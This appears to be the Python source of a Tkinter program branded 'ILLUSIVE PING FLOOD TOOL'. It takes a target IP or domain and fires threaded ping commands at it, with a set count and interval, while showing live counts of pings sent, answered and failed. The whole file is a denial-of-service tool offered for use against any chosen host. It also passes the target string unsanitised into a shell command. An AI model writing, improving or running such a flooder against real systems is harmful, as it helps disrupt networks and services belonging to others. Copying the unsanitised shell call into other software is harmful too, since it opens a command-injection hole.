import os
import time
import threading
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
from pystyle import Colors, Colorate, Add

# Banner and prompt
os.system("cls" if os.name == "nt" else "clear")
ascii_art = r'''
██╗██╗     ██╗     ██╗   ██╗███████╗██╗██╗   ██╗███████╗
██║██║     ██║     ██║   ██║██╔════╝██║██║   ██║██╔════╝
██║██║     ██║     ██║   ██║███████╗██║██║   ██║███████╗
██║██║     ██║     ██║   ██║╚════██║██║██║   ██║██     ║
██║███████╗███████╗╚██████╔╝███████║██║╚██████╔╝███████║
╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝ ╚═════╝ ╚══════╝    
             ILLUSIVE PING FLOOD TOOL                            
            CREDITS = ILLUSIVEHACKS - CIPHER  
'''
banner = r"v1".replace('▓', '▀')
full_banner = Add.Add(ascii_art, banner, center=True)
print(Colorate.Horizontal(Colors.red_to_blue, full_banner))

# Prompt user for initial target
TARGET = input("Enter Target IP or Domain: ").strip()
if not TARGET:
    TARGET = "your-website-or-ip-here"  # Default if no input

# Default ping settings
PING_COUNT = 1000
PING_INTERVAL = 0.1

# Global variables for ping tracking
sent_pings = 0
successful_pings = 0
failed_pings = 0
stop_flag = False

# Ping functions
def ping(target):
    """Send a single ping to the target."""
    global successful_pings, failed_pings

    response = os.system(f"ping {target} -n 1")  # For Windows
    if response == 0:
        successful_pings += 1
    else:
        failed_pings += 1

    update_status()

def ping_flood(target, count, interval):
    """Flood the target with ping requests."""
    global sent_pings, stop_flag

    for _ in range(count):
        if stop_flag:
            break
        threading.Thread(target=ping, args=(target,)).start()
        time.sleep(interval)
        sent_pings += 1
        update_status()

def update_status():
    """Update real-time ping status on the GUI."""
    sent_label.config(text=f"Pings Sent: {sent_pings}")
    successful_label.config(text=f"Successful Pings: {successful_pings}")
    failed_label.config(text=f"Failed Pings: {failed_pings}")

def start_ping_flood():
    """Start the ping flooding process."""
    global TARGET, PING_COUNT, PING_INTERVAL, sent_pings, successful_pings, failed_pings, stop_flag

    sent_pings = 0
    successful_pings = 0
    failed_pings = 0
    stop_flag = False

    TARGET = target_entry.get()
    try:
        PING_COUNT = int(count_entry.get())
        PING_INTERVAL = float(interval_entry.get())
    except ValueError:
        messagebox.showerror("Input Error", "Please enter valid numbers for count and interval.")
        return

    if not TARGET:
        messagebox.showerror("Input Error", "Please enter a valid target IP or domain.")
        return

    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)
    threading.Thread(target=ping_flood, args=(TARGET, PING_COUNT, PING_INTERVAL), daemon=True).start()
    messagebox.showinfo("Ping Flood", "Ping flooding started. Press 'Stop' to stop it.")

def stop_ping_flood():
    """Stop the ping flooding process."""
    global stop_flag

    stop_flag = True
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)
    messagebox.showinfo("Ping Flood", "Ping flooding stopped.")

def resize_bg(event):
    """Resize background image dynamically."""
    bg_image_resized = bg_image_original.resize((event.width, event.height), Image.Resampling.LANCZOS)
    bg_image_tk = ImageTk.PhotoImage(bg_image_resized)
    bg_label.config(image=bg_image_tk)
    bg_label.image = bg_image_tk

# GUI setup
root = tk.Tk()
root.title("Ping Flood GUI")
root.geometry("700x500")

# Background image
bg_image_original = Image.open("71316.png")  # Replace with your image path
bg_image_resized = bg_image_original.resize((700, 500), Image.Resampling.LANCZOS)
bg_image_tk = ImageTk.PhotoImage(bg_image_resized)

bg_label = tk.Label(root, image=bg_image_tk)
bg_label.place(relwidth=1, relheight=1)
bg_label.bind("<Configure>", resize_bg)

# Target input
target_label = tk.Label(root, text="Target (IP or Domain):", bg="greenyellow", font=("Helvetica", 12))
target_label.pack(pady=10)

target_entry = tk.Entry(root, width=30)
target_entry.pack(pady=5)
target_entry.insert(0, TARGET)

# Ping count input
count_label = tk.Label(root, text="Ping Count:", bg="greenyellow", font=("Helvetica", 12))
count_label.pack(pady=10)

count_entry = tk.Entry(root, width=30)
count_entry.pack(pady=5)
count_entry.insert(0, str(PING_COUNT))

# Interval input
interval_label = tk.Label(root, text="Ping Interval (seconds):", bg="greenyellow", font=("Helvetica", 12))
interval_label.pack(pady=10)

interval_entry = tk.Entry(root, width=30)
interval_entry.pack(pady=5)
interval_entry.insert(0, str(PING_INTERVAL))

# Status labels
sent_label = tk.Label(root, text="Pings Sent: 0", bg="lightgray", font=("Helvetica", 12))
sent_label.pack(pady=5)

successful_label = tk.Label(root, text="Successful Pings: 0", bg="blue", font=("Helvetica", 12))
successful_label.pack(pady=5)

failed_label = tk.Label(root, text="Failed Pings: 0", bg="red", font=("Helvetica", 12))
failed_label.pack(pady=5)

# Start and stop buttons
start_button = tk.Button(root, text="Start Ping Flood", bg="dark green", width=20, command=start_ping_flood)
start_button.pack(pady=20)

stop_button = tk.Button(root, text="Stop Ping Flood", bg="dark red", width=20, command=stop_ping_flood, state=tk.DISABLED)
stop_button.pack(pady=5)

# Run the GUI
root.mainloop()
